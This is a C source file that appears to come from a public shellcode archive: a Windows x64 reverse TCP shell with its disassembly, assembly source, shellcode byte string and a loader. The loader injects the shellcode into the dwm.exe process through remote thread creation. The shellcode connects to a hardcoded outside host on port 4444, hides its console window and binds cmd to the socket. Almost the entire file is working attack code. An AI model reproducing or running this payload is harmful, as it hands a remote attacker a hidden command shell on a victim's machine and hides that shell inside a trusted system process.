/*
	# Title : Windows x64 Reverse Shell TCP shellcode
	# size : 694 bytes
	# Author: Roziul Hasan Khan Shifat
	# Date : 10-11-2016
	# Tested on : Windows 7 x64 Professional
	# Email : shifath12@gmail.com
*/


/*





Disassembly of section .text:

0000000000000000 <s>:
   0:	48 31 d2             	xor    %rdx,%rdx
   3:	65 48 8b 42 60       	mov    %gs:0x60(%rdx),%rax
   8:	48 8b 70 18          	mov    0x18(%rax),%rsi
   c:	48 8b 76 10          	mov    0x10(%rsi),%rsi
  10:	48 ad                	lods   %ds:(%rsi),%rax
  12:	48 8b 30             	mov    (%rax),%rsi
  15:	48 8b 7e 30          	mov    0x30(%rsi),%rdi
  19:	b2 88                	mov    $0x88,%dl
  1b:	8b 5f 3c             	mov    0x3c(%rdi),%ebx
  1e:	48 01 fb             	add    %rdi,%rbx
  21:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  24:	48 01 fb             	add    %rdi,%rbx
  27:	44 8b 73 1c          	mov    0x1c(%rbx),%r14d
  2b:	49 01 fe             	add    %rdi,%r14
  2e:	66 ba fc 0c          	mov    $0xcfc,%dx
  32:	41 8b 1c 16          	mov    (%r14,%rdx,1),%ebx
  36:	48 01 fb             	add    %rdi,%rbx
  39:	48 31 d2             	xor    %rdx,%rdx
  3c:	52                   	push   %rdx
  3d:	52                   	push   %rdx
  3e:	c7 04 24 77 73 32 5f 	movl   $0x5f327377,(%rsp)
  45:	c7 44 24 04 33 32 2e 	movl   $0x642e3233,0x4(%rsp)
  4c:	64
  4d:	66 c7 44 24 08 6c 6c 	movw   $0x6c6c,0x8(%rsp)
  54:	48 8d 0c 24          	lea    (%rsp),%rcx
  58:	48 83 ec 58          	sub    $0x58,%rsp
  5c:	ff d3                	callq  *%rbx
  5e:	48 83 c4 68          	add    $0x68,%rsp
  62:	48 89 c6             	mov    %rax,%rsi
  65:	48 31 db             	xor    %rbx,%rbx
  68:	48 31 d2             	xor    %rdx,%rdx
  6b:	b2 88                	mov    $0x88,%dl
  6d:	8b 5e 3c             	mov    0x3c(%rsi),%ebx
  70:	48 01 f3             	add    %rsi,%rbx
  73:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  76:	48 01 f3             	add    %rsi,%rbx
  79:	44 8b 7b 1c          	mov    0x1c(%rbx),%r15d
  7d:	49 01 f7             	add    %rsi,%r15
  80:	48 31 d2             	xor    %rdx,%rdx
  83:	66 ba c8 01          	mov    $0x1c8,%dx
  87:	41 8b 1c 17          	mov    (%r15,%rdx,1),%ebx
  8b:	48 01 f3             	add    %rsi,%rbx
  8e:	66 ba 98 01          	mov    $0x198,%dx
  92:	48 29 d4             	sub    %rdx,%rsp
  95:	48 8d 14 24          	lea    (%rsp),%rdx
  99:	48 31 c9             	xor    %rcx,%rcx
  9c:	66 b9 02 02          	mov    $0x202,%cx
  a0:	48 83 ec 58          	sub    $0x58,%rsp
  a4:	ff d3                	callq  *%rbx
  a6:	48 31 d2             	xor    %rdx,%rdx
  a9:	48 83 ec 58          	sub    $0x58,%rsp
  ad:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
  b2:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  b7:	48 ff c2             	inc    %rdx
  ba:	48 89 d1             	mov    %rdx,%rcx
  bd:	48 ff c1             	inc    %rcx
  c0:	4d 31 c0             	xor    %r8,%r8
  c3:	49 83 c0 06          	add    $0x6,%r8
  c7:	4d 31 c9             	xor    %r9,%r9
  ca:	66 41 b9 88 01       	mov    $0x188,%r9w
  cf:	43 8b 1c 0f          	mov    (%r15,%r9,1),%ebx
  d3:	48 01 f3             	add    %rsi,%rbx
  d6:	4d 31 c9             	xor    %r9,%r9
  d9:	ff d3                	callq  *%rbx
  db:	49 89 c5             	mov    %rax,%r13
  de:	4d 31 c0             	xor    %r8,%r8
  e1:	41 50                	push   %r8
  e3:	41 50                	push   %r8
  e5:	c6 04 24 02          	movb   $0x2,(%rsp)
  e9:	66 c7 44 24 02 11 5c 	movw   $0x5c11,0x2(%rsp)
  f0:	c7 44 24 04 c0 a8 0a 	movl   $0x800aa8c0,0x4(%rsp)
  f7:	80
  f8:	4c 8d 24 24          	lea    (%rsp),%r12
  fc:	48 83 ec 58          	sub    $0x58,%rsp

0000000000000100 <c>:
 100:	48 31 db             	xor    %rbx,%rbx
 103:	41 8b 5f 0c          	mov    0xc(%r15),%ebx
 107:	48 01 f3             	add    %rsi,%rbx
 10a:	4c 89 e2             	mov    %r12,%rdx
 10d:	4c 89 e9             	mov    %r13,%rcx
 110:	41 b0 10             	mov    $0x10,%r8b
 113:	ff d3                	callq  *%rbx
 115:	4d 31 c0             	xor    %r8,%r8
 118:	4c 39 c0             	cmp    %r8,%rax
 11b:	75 e3                	jne    100 <c>
 11d:	48 31 db             	xor    %rbx,%rbx
 120:	41 8b 5e 40          	mov    0x40(%r14),%ebx
 124:	48 01 fb             	add    %rdi,%rbx
 127:	ff d3                	callq  *%rbx
 129:	48 31 d2             	xor    %rdx,%rdx
 12c:	52                   	push   %rdx
 12d:	52                   	push   %rdx
 12e:	c7 04 24 75 73 65 72 	movl   $0x72657375,(%rsp)
 135:	c7 44 24 04 33 32 2e 	movl   $0x642e3233,0x4(%rsp)
 13c:	64
 13d:	66 c7 44 24 08 6c 6c 	movw   $0x6c6c,0x8(%rsp)
 144:	48 8d 0c 24          	lea    (%rsp),%rcx
 148:	66 ba fc 0c          	mov    $0xcfc,%dx
 14c:	41 8b 1c 16          	mov    (%r14,%rdx,1),%ebx
 150:	48 01 fb             	add    %rdi,%rbx
 153:	48 83 ec 58          	sub    $0x58,%rsp
 157:	ff d3                	callq  *%rbx
 159:	48 89 c6             	mov    %rax,%rsi
 15c:	48 31 db             	xor    %rbx,%rbx
 15f:	48 31 d2             	xor    %rdx,%rdx
 162:	66 ba 4a 02          	mov    $0x24a,%dx
 166:	45 8b 24 96          	mov    (%r14,%rdx,4),%r12d
 16a:	49 01 fc             	add    %rdi,%r12
 16d:	48 31 c9             	xor    %rcx,%rcx
 170:	51                   	push   %rcx
 171:	51                   	push   %rcx
 172:	c7 04 24 46 69 6e 64 	movl   $0x646e6946,(%rsp)
 179:	c7 44 24 04 57 69 6e 	movl   $0x646e6957,0x4(%rsp)
 180:	64
 181:	c7 44 24 08 6f 77 41 	movl   $0x4141776f,0x8(%rsp)
 188:	41
 189:	80 74 24 0b 41       	xorb   $0x41,0xb(%rsp)
 18e:	48 8d 14 24          	lea    (%rsp),%rdx
 192:	48 89 f1             	mov    %rsi,%rcx
 195:	48 83 ec 58          	sub    $0x58,%rsp
 199:	41 ff d4             	callq  *%r12
 19c:	48 31 d2             	xor    %rdx,%rdx
 19f:	52                   	push   %rdx
 1a0:	52                   	push   %rdx
 1a1:	52                   	push   %rdx
 1a2:	c7 04 24 43 6f 6e 73 	movl   $0x736e6f43,(%rsp)
 1a9:	c7 44 24 04 6f 6c 65 	movl   $0x57656c6f,0x4(%rsp)
 1b0:	57
 1b1:	c7 44 24 08 69 6e 64 	movl   $0x6f646e69,0x8(%rsp)
 1b8:	6f
 1b9:	c7 44 24 0c 77 43 6c 	movl   $0x616c4377,0xc(%rsp)
 1c0:	61
 1c1:	66 c7 44 24 10 73 73 	movw   $0x7373,0x10(%rsp)
 1c8:	48 8d 0c 24          	lea    (%rsp),%rcx
 1cc:	48 83 ec 58          	sub    $0x58,%rsp
 1d0:	ff d0                	callq  *%rax
 1d2:	49 89 c7             	mov    %rax,%r15
 1d5:	48 31 d2             	xor    %rdx,%rdx
 1d8:	48 31 c9             	xor    %rcx,%rcx
 1db:	51                   	push   %rcx
 1dc:	51                   	push   %rcx
 1dd:	c7 04 24 53 68 6f 77 	movl   $0x776f6853,(%rsp)
 1e4:	c7 44 24 04 57 69 6e 	movl   $0x646e6957,0x4(%rsp)
 1eb:	64
 1ec:	66 c7 44 24 08 6f 77 	movw   $0x776f,0x8(%rsp)
 1f3:	48 8d 14 24          	lea    (%rsp),%rdx
 1f7:	48 89 f1             	mov    %rsi,%rcx
 1fa:	48 83 ec 58          	sub    $0x58,%rsp
 1fe:	41 ff d4             	callq  *%r12
 201:	4c 89 f9             	mov    %r15,%rcx
 204:	48 31 d2             	xor    %rdx,%rdx
 207:	48 83 ec 58          	sub    $0x58,%rsp
 20b:	ff d0                	callq  *%rax
 20d:	66 ba 90 02          	mov    $0x290,%dx
 211:	41 8b 1c 16          	mov    (%r14,%rdx,1),%ebx
 215:	48 01 fb             	add    %rdi,%rbx
 218:	48 83 ec 68          	sub    $0x68,%rsp
 21c:	48 83 ec 18          	sub    $0x18,%rsp
 220:	4c 8d 24 24          	lea    (%rsp),%r12
 224:	b2 68                	mov    $0x68,%dl
 226:	48 31 c9             	xor    %rcx,%rcx
 229:	41 89 14 24          	mov    %edx,(%r12)
 22d:	49 89 4c 24 04       	mov    %rcx,0x4(%r12)
 232:	49 89 4c 24 0c       	mov    %rcx,0xc(%r12)
 237:	49 89 4c 24 14       	mov    %rcx,0x14(%r12)
 23c:	49 89 4c 24 18       	mov    %rcx,0x18(%r12)
 241:	48 31 d2             	xor    %rdx,%rdx
 244:	b2 ff                	mov    $0xff,%dl
 246:	48 ff c2             	inc    %rdx
 249:	41 89 54 24 3c       	mov    %edx,0x3c(%r12)
 24e:	4d 89 6c 24 50       	mov    %r13,0x50(%r12)
 253:	4d 89 6c 24 58       	mov    %r13,0x58(%r12)
 258:	4d 89 6c 24 60       	mov    %r13,0x60(%r12)
 25d:	68 63 6d 64 41       	pushq  $0x41646d63
 262:	88 54 24 03          	mov    %dl,0x3(%rsp)
 266:	48 8d 14 24          	lea    (%rsp),%rdx
 26a:	48 ff c1             	inc    %rcx
 26d:	48 83 ec 58          	sub    $0x58,%rsp
 271:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
 276:	48 31 c9             	xor    %rcx,%rcx
 279:	4d 31 c0             	xor    %r8,%r8
 27c:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
 281:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
 286:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
 28b:	4d 8d 0c 24          	lea    (%r12),%r9
 28f:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
 294:	4d 8d 4c 24 68       	lea    0x68(%r12),%r9
 299:	4c 89 4c 24 48       	mov    %r9,0x48(%rsp)
 29e:	4d 31 c9             	xor    %r9,%r9
 2a1:	ff d3                	callq  *%rbx
 2a3:	48 31 d2             	xor    %rdx,%rdx
 2a6:	66 ba a0 04          	mov    $0x4a0,%dx
 2aa:	41 8b 1c 16          	mov    (%r14,%rdx,1),%ebx
 2ae:	48 01 fb             	add    %rdi,%rbx
 2b1:	48 31 c9             	xor    %rcx,%rcx
 2b4:	ff d3                	callq  *%rbx







*/




/*

section .text
	global s
s:

xor rdx,rdx
mov rax,[gs:rdx+0x60]
mov rsi,[rax+0x18]
mov rsi,[rsi+0x10]
lodsq
mov rsi,[rax]
mov rdi,[rsi+0x30]

;--------------------------------
mov dl,0x88
mov ebx,[rdi+0x3c]
add rbx,rdi
mov ebx,[rbx+rdx]
add rbx,rdi ;IMAGE_EXPORT_DIRECTORY


mov r14d,[rbx+0x1c]
add r14,rdi ;kernel32.dll AddressOfFunctions


;-----------------------
;loading ws2_32.dll

mov dx,831*4
mov ebx,[r14+rdx]
add rbx,rdi ;LoadLibraryA()

xor rdx,rdx
push rdx
push rdx

mov [rsp],dword 'ws2_'
mov [rsp+4],dword '32.d'
mov [rsp+8],word 'll'


lea rcx,[rsp]

sub rsp,88

call rbx

add rsp,104

mov rsi,rax ;ws2_32.dll base address
;--------------------------------------
xor rbx,rbx
xor rdx,rdx

;finding Export table of ws2_32.dll

mov dl,0x88
mov ebx,[rsi+0x3c]
add rbx,rsi
mov ebx,[rbx+rdx]
add rbx,rsi ;IMAGE_EXPORT_DIRECTORY


mov r15d,[rbx+0x1c]
add r15,rsi ;ws2_32.dll AddressOfFunctions


;--------------------------------------

;WSAStartup(514,&WSADATA)

xor rdx,rdx
mov dx,114*4
mov ebx,[r15+rdx]
add rbx,rsi ;rbx=WSAStartup()


mov dx,408

sub rsp,rdx
lea rdx,[rsp]
xor rcx,rcx
mov cx,514

sub rsp,88 ;reserving space for API call (Important)

call rbx

;-------------------------------------------------------
;WSASocketA(2,1,6,0,0,0)

xor rdx,rdx
sub rsp,88

mov [rsp+32],rdx
mov [rsp+40],rdx


inc rdx
mov rcx,rdx
inc rcx

xor r8,r8
add r8,6

xor r9,r9

mov r9w,98*4
mov ebx,[r15+r9]
add rbx,rsi ;rbx=WSASocketA()

xor r9,r9
call rbx

mov r13,rax ;r13=SOCKET

;------------------------------------------
xor r8,r8
push r8
push r8

mov [rsp],byte 2
mov [rsp+2],word 0x5c11 ;port 4444
mov [rsp+4],dword 0x800aa8c0 ;change it
lea r12,[rsp]
sub rsp,88
;-------------------------------------------
;connect(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)
c:
xor rbx,rbx
mov ebx,[r15+12]
add rbx,rsi ;rbx=connect()



mov rdx,r12
mov rcx,r13
mov r8b,16



call rbx
xor r8,r8
cmp rax,r8
jnz c

;----------------------------------------------------------------------------------------
;Hiding Window
;----------------------------------------------------------------------------------------

;AllocConsole()
xor rbx,rbx
mov ebx,[r14+64]
add rbx,rdi ;rbx=AllocConsole()

call rbx
;------------------------------
;loading user32.dll

xor rdx,rdx
push rdx
push rdx
mov [rsp],dword 'user'
mov [rsp+4],dword '32.d'
mov [rsp+8],word 'll'
lea rcx,[rsp]

mov dx,831*4
mov ebx,[r14+rdx]
add rbx,rdi
sub rsp,88

call rbx

mov rsi,rax
;--------------------------------

xor rbx,rbx
xor rdx,rdx

;----------------------------------
;FindWindowA("ConsoleWindowClass",NULL)

mov dx,586
mov r12d,[r14+rdx*4]
add r12,rdi ;rbx=GetProcAddress()

xor rcx,rcx
push rcx
push rcx
mov [rsp],dword 'Find'
mov [rsp+4],dword 'Wind'
mov [rsp+8],dword 'owAA'
xor byte [rsp+11],0x41

lea rdx,[rsp]
mov rcx,rsi

sub rsp,88
call r12



;-----------------------------------
xor rdx,rdx
push rdx
push rdx
push rdx

mov [rsp],dword 'Cons'
mov [rsp+4],dword 'oleW'
mov [rsp+8],dword 'indo'
mov [rsp+12],dword 'wCla'
mov [rsp+16],word 'ss'

lea rcx,[rsp]

sub rsp,88

call rax

mov r15,rax
xor rdx,rdx
;---------------------------------------
;ShowWindow(HWND,0)

xor rcx,rcx
push rcx
push rcx
mov [rsp],dword 'Show'
mov [rsp+4],dword 'Wind'
mov [rsp+8],word 'ow'

lea rdx,[rsp]
mov rcx,rsi

sub rsp,88
call r12


mov rcx,r15
xor rdx,rdx
sub rsp,88
call rax

;-----------------------------------------------

;--------------------------------------------------------------------------------------------------------------------------------
;CreateProcessA()
mov dx,164*4
mov ebx,[r14+rdx]
add rbx,rdi


;STARTUPINFOA+PROCESS_INFORMATION
;----------------------------------
sub rsp,104
sub rsp,24
lea r12,[rsp]

mov dl,104

xor rcx,rcx
mov [r12],dword edx
mov [r12+4],rcx
mov [r12+12],rcx
mov [r12+20],rcx
mov [r12+24],rcx

xor rdx,rdx
mov dl,255
inc rdx

mov [r12+0x3c],edx
mov [r12+0x50],r13
mov [r12+0x58],r13
mov [r12+0x60],r13

;--------------------------------------------------

push 'cmdA'
mov [rsp+3],byte dl

lea rdx,[rsp]

inc rcx
;-------------------------------------
sub rsp,88

mov [rsp+32],rcx
xor rcx,rcx

xor r8,r8

mov [rsp+40],r8
mov [rsp+48],r8
mov [rsp+56],r8
lea r9,[r12]
mov [rsp+64],r9
lea r9,[r12+104]
mov [rsp+72],r9

xor r9,r9

call rbx

;-------------------------------

xor rdx,rdx
mov dx,296*4
mov ebx,[r14+rdx]
add rbx,rdi

xor rcx,rcx
call rbx




*/






#include<stdio.h>
#include<windows.h>
#include<TlHelp32.h>
#include<string.h>


char shellcode[]="\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\xb2\x88\x8b\x5f\x3c\x48\x01\xfb\x8b\x1c\x13\x48\x01\xfb\x44\x8b\x73\x1c\x49\x01\xfe\x66\xba\xfc\x0c\x41\x8b\x1c\x16\x48\x01\xfb\x48\x31\xd2\x52\x52\xc7\x04\x24\x77\x73\x32\x5f\xc7\x44\x24\x04\x33\x32\x2e\x64\x66\xc7\x44\x24\x08\x6c\x6c\x48\x8d\x0c\x24\x48\x83\xec\x58\xff\xd3\x48\x83\xc4\x68\x48\x89\xc6\x48\x31\xdb\x48\x31\xd2\xb2\x88\x8b\x5e\x3c\x48\x01\xf3\x8b\x1c\x13\x48\x01\xf3\x44\x8b\x7b\x1c\x49\x01\xf7\x48\x31\xd2\x66\xba\xc8\x01\x41\x8b\x1c\x17\x48\x01\xf3\x66\xba\x98\x01\x48\x29\xd4\x48\x8d\x14\x24\x48\x31\xc9\x66\xb9\x02\x02\x48\x83\xec\x58\xff\xd3\x48\x31\xd2\x48\x83\xec\x58\x48\x89\x54\x24\x20\x48\x89\x54\x24\x28\x48\xff\xc2\x48\x89\xd1\x48\xff\xc1\x4d\x31\xc0\x49\x83\xc0\x06\x4d\x31\xc9\x66\x41\xb9\x88\x01\x43\x8b\x1c\x0f\x48\x01\xf3\x4d\x31\xc9\xff\xd3\x49\x89\xc5\x4d\x31\xc0\x41\x50\x41\x50\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\xc0\xa8\x0a\x80\x4c\x8d\x24\x24\x48\x83\xec\x58\x48\x31\xdb\x41\x8b\x5f\x0c\x48\x01\xf3\x4c\x89\xe2\x4c\x89\xe9\x41\xb0\x10\xff\xd3\x4d\x31\xc0\x4c\x39\xc0\x75\xe3\x48\x31\xdb\x41\x8b\x5e\x40\x48\x01\xfb\xff\xd3\x48\x31\xd2\x52\x52\xc7\x04\x24\x75\x73\x65\x72\xc7\x44\x24\x04\x33\x32\x2e\x64\x66\xc7\x44\x24\x08\x6c\x6c\x48\x8d\x0c\x24\x66\xba\xfc\x0c\x41\x8b\x1c\x16\x48\x01\xfb\x48\x83\xec\x58\xff\xd3\x48\x89\xc6\x48\x31\xdb\x48\x31\xd2\x66\xba\x4a\x02\x45\x8b\x24\x96\x49\x01\xfc\x48\x31\xc9\x51\x51\xc7\x04\x24\x46\x69\x6e\x64\xc7\x44\x24\x04\x57\x69\x6e\x64\xc7\x44\x24\x08\x6f\x77\x41\x41\x80\x74\x24\x0b\x41\x48\x8d\x14\x24\x48\x89\xf1\x48\x83\xec\x58\x41\xff\xd4\x48\x31\xd2\x52\x52\x52\xc7\x04\x24\x43\x6f\x6e\x73\xc7\x44\x24\x04\x6f\x6c\x65\x57\xc7\x44\x24\x08\x69\x6e\x64\x6f\xc7\x44\x24\x0c\x77\x43\x6c\x61\x66\xc7\x44\x24\x10\x73\x73\x48\x8d\x0c\x24\x48\x83\xec\x58\xff\xd0\x49\x89\xc7\x48\x31\xd2\x48\x31\xc9\x51\x51\xc7\x04\x24\x53\x68\x6f\x77\xc7\x44\x24\x04\x57\x69\x6e\x64\x66\xc7\x44\x24\x08\x6f\x77\x48\x8d\x14\x24\x48\x89\xf1\x48\x83\xec\x58\x41\xff\xd4\x4c\x89\xf9\x48\x31\xd2\x48\x83\xec\x58\xff\xd0\x66\xba\x90\x02\x41\x8b\x1c\x16\x48\x01\xfb\x48\x83\xec\x68\x48\x83\xec\x18\x4c\x8d\x24\x24\xb2\x68\x48\x31\xc9\x41\x89\x14\x24\x49\x89\x4c\x24\x04\x49\x89\x4c\x24\x0c\x49\x89\x4c\x24\x14\x49\x89\x4c\x24\x18\x48\x31\xd2\xb2\xff\x48\xff\xc2\x41\x89\x54\x24\x3c\x4d\x89\x6c\x24\x50\x4d\x89\x6c\x24\x58\x4d\x89\x6c\x24\x60\x68\x63\x6d\x64\x41\x88\x54\x24\x03\x48\x8d\x14\x24\x48\xff\xc1\x48\x83\xec\x58\x48\x89\x4c\x24\x20\x48\x31\xc9\x4d\x31\xc0\x4c\x89\x44\x24\x28\x4c\x89\x44\x24\x30\x4c\x89\x44\x24\x38\x4d\x8d\x0c\x24\x4c\x89\x4c\x24\x40\x4d\x8d\x4c\x24\x68\x4c\x89\x4c\x24\x48\x4d\x31\xc9\xff\xd3\x48\x31\xd2\x66\xba\xa0\x04\x41\x8b\x1c\x16\x48\x01\xfb\x48\x31\xc9\xff\xd3";




void inject(DWORD );
int main()
{
	char program_name[]="dwm.exe"; //Process name to inject. change it if U Want

	BOOL f=0;
	HANDLE snap;
	PROCESSENTRY32 pe32;

	snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	if(snap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot() Failed."); return 0;
	}

	pe32.dwSize=sizeof(pe32);

	if(!Process32First(snap,&pe32))
	{
		printf("Process32First() Failed."); return 0;
	}



	do
	{
		if(0==strncmp(program_name,pe32.szExeFile,strlen(program_name)))
		{
			f=TRUE;
			break;
		}

	}while(Process32Next(snap,&pe32));


	if(!f)
	{
		printf("No infomation found about \"%s\" ",program_name);
	}
	else
	{
		printf("Program name:%s\nProcess id: %d",pe32.szExeFile,pe32.th32ProcessID);
		printf("\nInjecting shellcode");
		inject(pe32.th32ProcessID);
	}



	return 0;

}



void inject(DWORD pid)
{
	HANDLE phd,h;
	LPVOID shell;

	phd=OpenProcess(PROCESS_ALL_ACCESS,0,pid);

	if(phd==INVALID_HANDLE_VALUE)
	{
		printf("\nOpenProcess() Failed."); return ;
	}

	shell=VirtualAllocEx(phd,0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if(shell==NULL)
	{
		printf("\nVirtualAllocEx() Failed");  CloseHandle(phd); return ;
	}

	WriteProcessMemory(phd,shell,shellcode,sizeof(shellcode),0);
	printf("\nInjection successfull\n");
	printf("Running Shellcode......\n");

	h=CreateRemoteThread(phd,NULL,0,(LPTHREAD_START_ROUTINE)shell,NULL,0,0);
	if(h==NULL)
	{
		printf("Failed to Run Shellcode\n"); return ;
	}
	else
		printf("shellcode Execution Successfull");
}